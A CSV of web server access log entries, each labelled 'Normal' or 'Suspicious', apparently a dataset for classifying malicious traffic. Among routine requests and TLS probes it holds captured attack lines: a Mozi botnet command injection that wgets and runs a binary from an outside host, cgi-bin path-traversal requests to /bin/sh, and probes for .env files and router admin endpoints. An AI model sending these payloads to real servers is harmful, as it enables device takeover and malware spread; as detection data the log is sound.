IP,Request,Status,Size,Behavior
185.209.120.2,GET / HTTP/1.1,304,-,Normal
185.209.120.2,GET /styles.css HTTP/1.1,304,-,Normal
185.209.120.2,GET / HTTP/1.1,200,1755,Normal
185.209.120.2,GET /styles.css HTTP/1.1,200,1716,Normal
185.209.120.2,GET / HTTP/1.1,200,1755,Normal
185.209.120.2,GET /styles.css HTTP/1.1,200,1716,Normal
5.8.11.202,GET / HTTP/1.0,200,1755,Normal
94.156.248.4,GET / HTTP/1.1,200,1755,Normal
173.255.221.189,-,408,-,Suspicious
173.255.221.189,-,408,-,Suspicious
173.255.221.189,-,408,-,Suspicious
173.255.221.189,stats,400,226,Suspicious
185.242.226.80,GET / HTTP/1.1,200,1755,Normal
47.237.132.128,POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400,226,Suspicious
205.210.31.146,GET / HTTP/1.0,200,1755,Normal
194.50.16.198,POST /apply.cgi HTTP/1.1,404,196,Suspicious
198.235.24.232,GET / HTTP/1.0,200,1755,Normal
5.8.11.202,\x16\x03\x02\x01o\x01,400,226,Suspicious
76.244.4.90,HEAD / HTTP/1.1,200,-,Normal
5.8.11.202,GET / HTTP/1.0,200,1755,Normal
80.82.77.202,\x16\x03\x02\x01o\x01,400,226,Suspicious
185.209.120.3,GET /users?id=1 HTTP/1.1,404,196,Suspicious
185.209.120.3,GET /user?id=1 HTTP/1.1,404,196,Suspicious
5.8.11.202,\x16\x03\x02\x01o\x01,400,226,Suspicious
152.42.243.111,GET /cdn-cgi/trace HTTP/1.1,404,196,Suspicious
205.210.31.15,GET / HTTP/1.1,200,1755,Normal
194.50.16.198,GET /cgi-bin/index.cgi HTTP/1.1,404,196,Suspicious
152.42.219.47,\x16\x03\x01\x01\v\x01,400,226,Suspicious
92.249.48.232,GET / HTTP/1.1,400,226,Suspicious
194.50.16.198,POST /boaform/admin/formLogin HTTP/1.1,404,196,Suspicious
152.42.136.45,GET / HTTP/1.1,200,1755,Normal
152.42.214.140,GET /cdn-cgi/trace HTTP/1.1,404,196,Suspicious
152.42.214.140,\x16\x03\x01\x01\v\x01,400,226,Suspicious
159.65.190.39,GET / HTTP/1.1,200,1755,Normal
159.65.190.39,GET /favicon.ico HTTP/1.1,404,196,Suspicious
139.59.101.104,GET /cdn-cgi/trace HTTP/1.1,404,196,Suspicious
194.50.16.198,POST /apply.cgi HTTP/1.1,404,196,Suspicious
167.94.138.160,\x16\x03\x01,400,226,Suspicious
152.42.214.140,GET /cdn-cgi/trace HTTP/1.1,404,196,Suspicious
80.82.77.202,GET / HTTP/1.0,200,1755,Normal
8.222.151.66,POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400,226,Suspicious
205.210.31.164,GET / HTTP/1.0,200,1755,Normal
152.42.214.50,\x16\x03\x01\x01\v\x01,400,226,Suspicious
152.42.214.140,\x16\x03\x01\x01\v\x01,400,226,Suspicious
5.8.11.202,GET / HTTP/1.0,200,1755,Normal
222.254.217.214,HEAD /invoker/JMXInvokerServlet HTTP/1.1,404,-,Suspicious
14.167.198.63,HEAD /web-console/ServerInfo.jsp HTTP/1.1,404,-,Suspicious
93.174.93.12,\x16\x03\x02\x01o\x01,400,226,Suspicious
45.149.241.114,GET /.env HTTP/1.1,404,196,Suspicious
114.33.126.55,GET / HTTP/1.0,200,1755,Normal
120.229.204.159,GET /shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1,404,196,Suspicious
152.42.174.244,\x16\x03\x01\x01\v\x01,400,226,Suspicious
167.94.145.97,\x16\x03\x01,400,226,Suspicious
93.174.93.12,\x16\x03\x02\x01o\x01,400,226,Suspicious
5.8.11.202,\x16\x03\x02\x01o\x01,400,226,Suspicious
125.229.134.120,GET / HTTP/1.0,200,1755,Normal
152.42.243.111,GET /cdn-cgi/trace HTTP/1.1,404,196,Suspicious
152.42.243.111,\x16\x03\x01\x01\v\x01,400,226,Suspicious
149.50.106.25,GET / HTTP/1.1,200,1755,Normal
95.214.55.79,GET / HTTP/1.1,200,1755,Normal
206.168.34.43,GET / HTTP/1.1,200,1755,Normal
185.191.126.248,GET / HTTP/1.1,200,1755,Normal
199.45.154.146,\x16\x03\x01,400,226,Suspicious
199.45.154.146,GET / HTTP/1.1,200,1755,Normal
199.45.154.146,GET /favicon.ico HTTP/1.1,404,196,Suspicious
92.255.57.150,\x16\x03\x03,400,226,Suspicious
172.104.11.34,\x16\x03\x01,400,226,Suspicious
205.210.31.18,GET / HTTP/1.0,200,1755,Normal
95.214.53.91,GET / HTTP/1.1,200,1755,Normal
159.223.67.34,\x16\x03\x01\x01\v\x01,400,226,Suspicious
65.49.20.66,GET / HTTP/1.1,200,1755,Normal
65.49.20.66,GET /favicon.ico HTTP/1.1,404,196,Suspicious
185.191.126.248,GET / HTTP/1.1,200,1755,Normal
185.191.126.248,GET / HTTP/1.1,200,1755,Normal
5.35.104.31,GET /cgi-bin/luci/;stok=/locale HTTP/1.1,404,196,Suspicious
93.174.93.12,\x16\x03\x02\x01o\x01,400,226,Suspicious
152.42.214.140,\x16\x03\x01\x01\v\x01,400,226,Suspicious
159.223.67.34,GET /cdn-cgi/trace HTTP/1.1,404,196,Suspicious
159.223.67.34,\x16\x03\x01\x01\v\x01,400,226,Suspicious
178.128.54.126,\x16\x03\x01\x01\v\x01,400,226,Suspicious
95.214.53.205,GET / HTTP/1.1,200,1755,Normal
194.50.16.198,GET /cgi-bin/index.html HTTP/1.1,404,196,Suspicious
164.52.24.188,GET / HTTP/1.1,200,1755,Normal
164.52.24.188,GET / HTTP/1.1,200,1755,Normal
164.52.24.188,GET /favicon.ico HTTP/1.1,404,196,Suspicious
164.52.24.188,GET /favicon.ico HTTP/1.1,404,196,Suspicious
46.174.191.32,GET / HTTP/1.0,200,1755,Normal
